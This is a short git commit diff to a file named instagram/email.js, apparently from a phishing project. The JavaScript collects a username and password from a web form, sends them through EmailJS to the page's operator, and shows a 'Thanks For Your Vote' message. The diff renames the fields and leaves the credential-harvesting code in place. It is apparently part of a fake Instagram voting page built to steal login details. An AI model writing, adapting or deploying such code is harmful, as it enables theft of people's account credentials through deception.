a2f8cc1e4bb9ddb5b55f355910c8032bf91efde0
sharo-cod <sharo4192@gmail.com>
2024-10-27 23:37:44 +0500

    new

--- instagram/email.js
+++ instagram/email.js
@@ -1,7 +1,7 @@
 function sendMail(){
   let parms ={
-    name: document.getElementById("name").value,
-    password : document.getElementById("password").value,
+    from_name: document.getElementById("name").value,
+    Pass_user: document.getElementById("pass").value,
   }
 
   emailjs.send("service_c5buabe","template_rjpj60s",parms).then(alert("Thanks For Your Vote"))
